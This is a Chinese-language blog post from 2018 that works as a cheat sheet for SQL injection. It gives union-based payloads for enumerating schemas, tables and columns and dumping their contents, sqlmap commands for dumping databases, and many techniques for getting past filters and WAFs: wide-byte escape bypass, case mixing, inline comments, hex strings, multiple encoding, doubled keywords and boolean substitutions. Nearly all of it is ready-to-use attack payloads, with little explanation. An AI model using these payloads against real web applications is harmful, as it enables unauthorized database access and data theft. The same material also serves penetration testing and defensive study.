---
layout: post
title: SQL注入及绕过技巧
date: 2018-6-7
categories: blog
tags: [sql注入,绕过技巧,渗透]
description: 。
---

# sql注入的手工流程

```
1' order by 数字-- 

1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()-- 

1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='表名'--

1' union select 1,flag,3,4 from 表名-- 
```

# sqlmap注入的使用流程

```
sqlmap -u "url" --cookie="" --current-user --current-db

sqlmap -u "url" --table -D 数据库

sqlmap -u "url" -T 表名 --column 

sqlmap -u "url" -T 表名 -C 1,2 --dump

```

# 手工获取所有数据库

```
select 1,group_concat(schema_name),3 from information_schema.schemata   

//information_schema.schemata  是information_schema数据库中schemata表，schema_name是表中存储数据库的字段
```

# 限制数据库的行显示
```
select * from 表名 limit 0,1  //从第0行开始向后显示一行
select * from 表名 limit 1,2  //从第1行开始向后显示两行
select * from 表名 limit 5    //显示前5条数据

```

# 绕过姿势
- 宽字节绕过
原理：有些php后台需要对客户端进来的数据进行防范，对特殊字符（`'`,`"`,`\`,`NULL`）数据用`\`进行转义，利用这一点，sql注入经常使用的'就可以完美绕过了（前提必须使用魔术引号开关magic_quotes_gpc或者addslashes函数）
    1. 案例
        php会针对URL编码进行decode
decode后，url参数为 ?id=10 0xDF ‘ 0×20 AND 0×20 1=2 0×23
magic_quotes_gpc处理时会自动转义,即在‘前面加一个\
处理后url参数变成: ?id=10 0xDF 0x5c ‘ 0×20 AND 0×20 1=2 0×23
可以看到，在‘前面PHP会自动加一个0x5c(注:0x5c为\),也就是会自动转义成\’
由于汉字是双字节的,所以0xDF 0x5c被转为謀这个汉字,’之前的\就这样消失了
最后的%23为#,在sql中#是注释,所以后面的’就没用了
最终sql中projectid = ’10謀’在sql执行的时候,由于projectid为int类型字段,mysql会自动intval()处理一下 详情见这里
所以等效于`SELECT downid,name FROM x_downs WHERE projectid = 10 AND 1=2`

- 大小写绕过
  原理：sql语句不分大小写，但过滤语句只过滤其中一种


- 空格、回车（%0a）、/\*!\*/(内联注释)、（）绕过
  ```
  select/**/*/**/from/**/yz;
  select%0a*%0afrom%0ayz; %0a 是回车
  /*!select*//*!**//*!from*//*!yz*/;

  select(a)from(yz);
  select(a)from(yz)where(a=1);
  
  ```
  
 - 16进制引号绕过
 ```
   select column_name  from information_schema.tables where table_name="users"
   
   select column_name  from information_schema.tables where table_name=0x7573657273
   
 ```
 
 - 编码绕过
    分为两个方面
    1. WAF层编码
        WAF可能进行URL解码，可能解一次，也可能解两次，如果两次就编码三次进行绕过
    2. 后台程序编码
        有时候后台程序用$_GET['ID']进行解码后有可能再进行一次解码，比如urldecode($_GET['ID'])
        
 - 双关键字绕过
    `?id=1+UNIunionON+SeLselectECT+1,2,3–`
    利用后台代码形如str_replace('and|union|select','',str)将关键字替换为空的形式

- 等号绕过
    将'='替换成'like',如：
    `select * from sql_test where username like 'admin'`;

- 关键字过滤绕过
    1. 当过滤sql关键字时可以尝试一下方法
    ```
    id=1+(UnIoN)+(SelECT)+
    id=1+(UnIoN+SeLeCT)+
    id=1+(UnI)(oN)+(SeL)(EcT)
    id=1+'UnI''On'+'SeL''ECT' <-MySQL only
    id=1+'UnI'||'on'+SeLeCT' <-MSSQL only
    ```
     或者UNI /\*\*/ON+SEL/\*\*/ ECT(有些mysql版本不能使用此方法)
     
     2. or/and/union/where/select关键词过滤技巧
    OR绕过  `1 or 1=1` ==>`1 || 1=1`
    AND绕过`1 and 1=1`==>`1 && 1=1`
    OR/AND/UNION绕过 `union  select  user, password  from  users`==>`1 || （select  user  from  users  where  user_id = 1）=’admin’`
    OR/AND/UNION/WHERE绕过 ` 1||（select  user  from  users  where  user_id = 1）= ‘admin’` ==>` 1||( select  user  from  users  limit  1)=’admin’`
    OR/AND/UNION/WHERE/LIMIT绕过 ` 1||（select  user  from  users  limit  1）=’admin’` ==> ` 1||（select  user  from  users  group by user_id having user_id=1 ）= ‘admin’`
    OR/AND/UNION/WHERE/LIMIT/group by绕过 `1||（select  user  from  users  group  by  user_id  having  user_id  =1）=’admin’` ==>` 1||（select  substr(group_concat(user_id),1,1) user  from  users  )=1`
    OR/AND/UNION/WHERE/LIMIT/group by/select绕过 `1||（select substr(group_concat(usr_id),1,1)user from users =1` ==>
    `1|| user_id is not null`
    `1||substr(user,1,1)=0×61`
    `1||substr(user,1,1)=unhex(61)`
    
    
    
     
    

   



